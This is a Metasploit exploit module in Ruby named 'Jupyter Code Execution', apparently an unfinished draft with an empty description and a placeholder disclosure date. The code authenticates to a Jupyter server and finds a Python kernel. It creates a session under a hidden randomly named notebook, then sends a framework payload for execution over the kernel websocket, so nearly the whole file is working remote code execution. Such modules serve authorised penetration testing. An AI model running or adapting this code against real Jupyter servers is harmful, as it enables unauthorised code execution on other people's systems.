##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jupyter Code Execution',
      'Description'    => %q{
      },
      'Author' =>
        [
          'Spencer McIntyre'
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'WfsDelay' => '10',
        },
      'References'     =>
        [
        ],
      'Platform'  => %w{ win linux unix python },
      'Targets'   =>
        [
          ['Python', {'Arch'  => ARCH_PYTHON }],
        ],
      'DisclosureDate' => 'Jan 18 2013', # todo: update me
      'DefaultTarget'  => 0,
      'Notes'          =>
        {
          'Stability'   => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        },
    ))

    register_options(
      [
        OptString.new('PASSWORD',  [ false, 'The password or authentication token', '' ]),
        OptString.new('TARGETURI', [ true,  'The path to the Jupyter application', '/' ])
      ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return CheckCode::Unknown('Failed to request the login page.') unless res&.code == 200
    token = res.get_html_document.xpath('//form//input[@name="_xsrf"]').first['value']

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'cookie' => res.get_cookies,
      'vars_post' => {
        'password' => datastore['PASSWORD'],
        '_xsrf' => token
      }
    })

    return CheckCode::Unknown('Failed to authenticate.') unless res&.code == 302

    @context = {
      cookies: [res.get_cookies, "_xsrf=#{token}"],
      xsrf_token: token
    }

    CheckCode::Appears
  end

  def send_request_api(uri, data: nil)
    opts = {
      'uri' => normalize_uri(target_uri.path, 'api', uri),
      'cookie' => @context[:cookies].join('; ')
    }
    if data.nil?
      opts['method'] = 'GET'
    else
      opts['method'] = 'POST'
      opts['ctype'] = 'application/json'
      opts['headers'] = {
        'X-Requested-With' => 'XMLHttpRequest',
        'X-XSRFToken' => @context[:xsrf_token]
      }
      opts['data'] = JSON.unparse(data)
    end

    res = send_request_cgi(opts)
    fail_with(Failure::UnexpectedReply, 'A request to the REST API failed.') if res.nil?

    res.get_json_document
  end

  def exploit
    result = send_request_api('kernelspecs')
    kernelspec = result['kernelspecs'].values.select { |value| value.dig('spec', 'language').downcase.start_with?('python') }.first

    print_status("Creating a session using kernel: #{kernelspec['name']}")
    result = send_request_api('sessions', data: {
      'path' => ".#{Rex::Text.rand_text_alphanumeric(16..32)}.ipynb",
      'type' => "notebook",
      'name' => '',
      'kernel' => {
        'id' => nil,
        'name' => kernelspec['name']
      }
    })

    kernel_id = result.dig('kernel', 'id')
    fail_with(Failure::UnexpectedReply, 'Failed to create a session with the selected kernel.') if kernel_id.nil?

    session_id = Rex::Text.rand_text_hex(32)
    socket = connect_ws({
      'uri' => normalize_uri(target_uri.path, 'api', 'kernels', kernel_id, 'channels'),
      'cookie' => @context[:cookies].join('; '),
      'vars_get' => { 'session_id' => session_id }
    })

    socket.put_wstext(JSON.unparse({
      "header" => {
        "msg_id" => Rex::Text.rand_text_hex(32),
        "username" => "username",
        "session" => session_id,
        "msg_type" => "execute_request",
        "version" => "5.2"
      },
      "metadata" => {},
      "content" => {
        "code" => payload.encoded,
        "silent" => false,
        "store_history" => true,
        "user_expressions" => {},
        "allow_stdin" => true,
        "stop_on_error" => true
        },
        "buffers" => [],
        "parent_header" => {},
        "channel" => "shell"
    }))

    print_status('Done')
  end
end
